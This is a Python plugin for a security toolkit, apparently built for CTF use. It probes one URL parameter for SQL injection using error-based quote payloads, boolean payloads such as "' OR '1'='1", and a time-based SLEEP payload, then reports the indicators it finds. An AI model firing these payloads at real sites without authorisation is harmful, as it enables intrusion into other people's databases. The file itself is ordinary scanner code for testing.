"""SQL injection probe: error-based, boolean-based, and time-based checks."""

from __future__ import annotations

import argparse
import re
import time

from rich.table import Table

from syctf.core.types import ExecutionContext
from syctf.utils.net_utils import http_get

_ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)|pg::syntaxerror",
    r"ora-\d{5}",
    r"sqlite3?::|sqlite_error",
    r"sqlstate\[",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
]
_ERROR_RE = re.compile("|".join(_ERROR_SIGNATURES), re.IGNORECASE)


def error_signature(text: str) -> str | None:
    """Return the matched DB error signature, if any."""

    match = _ERROR_RE.search(text or "")
    return match.group(0) if match else None


class SqliProbePlugin:
    """Test a single injection point (FUZZ) for SQLi across three techniques."""

    name = "sqli-probe"
    description = "SQLi detection: error-based, boolean-based, and time-based"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--url", required=True, help="URL with FUZZ at the injection point")
        parser.add_argument("--sleep", type=int, default=5, help="Seconds for time-based test")

    def _fetch(self, url: str, timeout: float):
        start = time.perf_counter()
        resp = http_get(url, timeout=timeout)
        elapsed = time.perf_counter() - start
        return resp, elapsed

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        template = str(args.url)
        if "FUZZ" not in template:
            context.console.print("[bold red]--url must contain FUZZ.[/bold red]")
            return 2

        timeout = max(float(args.sleep) + 5.0, float(getattr(context.config, "request_timeout", 12.0)))
        context.logger.info("web sqli-probe url=%s", template)
        from urllib.parse import quote

        def inject(payload: str) -> str:
            return template.replace("FUZZ", quote(payload, safe=""))

        findings: list[tuple[str, str, str]] = []

        # baseline
        base_resp, _ = self._fetch(inject(""), timeout)
        base_len = len(base_resp.text) if base_resp else 0

        # error-based
        for payload in ("'", '"', "')", "';"):
            resp, _ = self._fetch(inject(payload), timeout)
            sig = error_signature(resp.text) if resp else None
            if sig:
                findings.append(("error-based", payload, f"DB error: {sig}"))
                break

        # boolean-based
        true_resp, _ = self._fetch(inject("' OR '1'='1"), timeout)
        false_resp, _ = self._fetch(inject("' AND '1'='2"), timeout)
        if true_resp and false_resp:
            diff = abs(len(true_resp.text) - len(false_resp.text))
            if diff > 0 and (len(true_resp.text) != base_len or len(false_resp.text) != base_len):
                findings.append(("boolean-based", "' OR '1'='1 vs ' AND '1'='2", f"response len delta={diff}"))

        # time-based
        payload = f"' OR SLEEP({args.sleep})-- -"
        _, elapsed = self._fetch(inject(payload), timeout)
        if elapsed >= args.sleep - 0.5:
            findings.append(("time-based", payload, f"delayed {elapsed:.1f}s"))

        if not findings:
            context.console.print("[green]No SQLi indicators detected.[/green]")
            return 0

        table = Table(title="SQLi indicators")
        table.add_column("Technique", style="cyan")
        table.add_column("Payload", style="yellow")
        table.add_column("Evidence", style="green")
        for tech, payload, evidence in findings:
            table.add_row(tech, payload, evidence)
        context.console.print(table)
        return 0


plugin = SqliProbePlugin()
